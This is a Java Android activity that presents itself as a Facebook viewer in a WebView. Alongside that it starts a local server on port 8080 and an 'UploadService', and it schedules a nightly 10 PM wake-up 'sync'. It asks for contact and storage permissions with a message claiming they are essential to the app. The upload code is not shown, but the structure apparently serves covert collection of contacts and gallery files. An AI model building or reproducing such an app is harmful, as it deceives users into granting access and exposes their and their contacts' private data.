package com.phc.serviceapp;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 123;
    private WebView webView;
    private ProgressBar progressBar;
    private static final long SYNC_INTERVAL = 60 * 60 * 1000; // 1 hour in milliseconds
    private Timer syncTimer;
    private LocalServer localServer;
    private final String url = "https://www.facebook.com/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startLocalServer();

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progressBar);

        // Enable JavaScript and set up WebView
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                Toast.makeText(MainActivity.this, "HTTP error: " + errorResponse.getStatusCode(), Toast.LENGTH_SHORT).show();
                progressBar.setVisibility(View.GONE);
            }
        });


        // Use WebChromeClient to update the progress
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (newProgress < 100) {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(newProgress);
                } else {
                    progressBar.setVisibility(View.GONE);
                }
            }
        });

        webView.setOnScrollChangeListener(new View.OnScrollChangeListener() {
            @Override
            public void onScrollChange(View v, int scrollX, int scrollY, int oldScrollX, int oldScrollY) {
                if (!webView.canScrollVertically(1)) { // Check if scrolled to the bottom
                    Toast.makeText(MainActivity.this, "End of page reached", Toast.LENGTH_SHORT).show();
                }
            }
        });

        // Load the URL
        loadUrl();

//        startPeriodicSync();
        scheduleSyncAt10PM();

        // Check Permissions
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            startBackgroundService();
        }
    }

    private void startLocalServer() {
        try {
            localServer = new LocalServer(8080); // Start server on port 8080
            localServer.start();
            Toast.makeText(this, "Local service server started!", Toast.LENGTH_SHORT).show();

            // Start the upload service
            Intent serviceIntent = new Intent(this, UploadService.class);
            startService(serviceIntent);

        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(this, "Failed to start server: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void loadUrl() {
        if (NetworkUtils.isInternetAvailable(this)) {
            webView.loadUrl(url);
        } else {
            Toast.makeText(this, "No Internet Connection", Toast.LENGTH_SHORT).show();
            progressBar.setVisibility(View.GONE);
        }
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (syncTimer != null) {
            syncTimer.cancel(); // Stop the timer when the activity is destroyed
        }
    }

    private void startBackgroundService() {
        // Start the background service to upload data
        startService(new Intent(this, UploadService.class));
    }

    private void scheduleSyncAt10PM() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        // Intent to trigger the SyncReceiver
        Intent intent = new Intent(this, SyncReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        // Set the time to 10 PM
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, 22); // 10 PM
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);

        // If the time has already passed for today, schedule for tomorrow
        if (Calendar.getInstance().after(calendar)) {
            calendar.add(Calendar.DATE, 1);
        }

        // Schedule the alarm to repeat daily
        alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                calendar.getTimeInMillis(),
                AlarmManager.INTERVAL_DAY,
                pendingIntent
        );
    }

    private void startPeriodicSync() {
        syncTimer = new Timer();
        syncTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(() -> {
                    // Start UploadService
                    startService(new Intent(MainActivity.this, UploadService.class));
//                    Toast.makeText(MainActivity.this, "Data sync in progress...", Toast.LENGTH_SHORT).show();
                });
            }
        }, 0, SYNC_INTERVAL); // Start immediately, then repeat every hour
    }

    private boolean hasPermissions() {
        // Check both permissions separately
        boolean contactsPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        boolean storagePermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        return contactsPermission && storagePermission;
    }

    private void requestPermissions() {
        // Request both permissions at once, only if they are not granted
        List<String> permissionsToRequest = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_CONTACTS);
        }

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE
            );
        } else {
            // If permissions are already granted, proceed with functionality
            startBackgroundService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                boolean contactsPermissionGranted = false;
                boolean storagePermissionGranted = false;

                // Iterate over the results to determine which permissions were granted
                for (int i = 0; i < permissions.length; i++) {
                    if (permissions[i].equals(android.Manifest.permission.READ_CONTACTS)) {
                        contactsPermissionGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
                    } else if (permissions[i].equals(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
                        storagePermissionGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
                    }
                }

                if (contactsPermissionGranted && storagePermissionGranted) {
                    // Permissions granted, proceed with functionality
                    startBackgroundService();
                } else {
                    // Handle denied permissions
                    if (shouldShowRequestPermissionRationale(android.Manifest.permission.READ_CONTACTS) ||
                            shouldShowRequestPermissionRationale(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
                        Toast.makeText(this, "Permissions are required to access contacts and gallery for the app to function properly.", Toast.LENGTH_LONG).show();
                    } else {
                        showSettingsDialog();
                    }
                }
            } else {
                // Handle the case where no permissions are granted
                Toast.makeText(this, "Permissions denied. App functionality may be limited.", Toast.LENGTH_SHORT).show();
            }
        }
    }


    private void showSettingsDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Required");
        builder.setMessage("This permission is essential for the app's functionality. Please enable it in the app settings.");
        builder.setPositiveButton("Go to Settings", (dialog, which) -> {
            dialog.dismiss();
            openAppSettings();
        });
        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss());
        builder.show();
    }

    private void openAppSettings() {
        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        startActivity(intent);
    }




}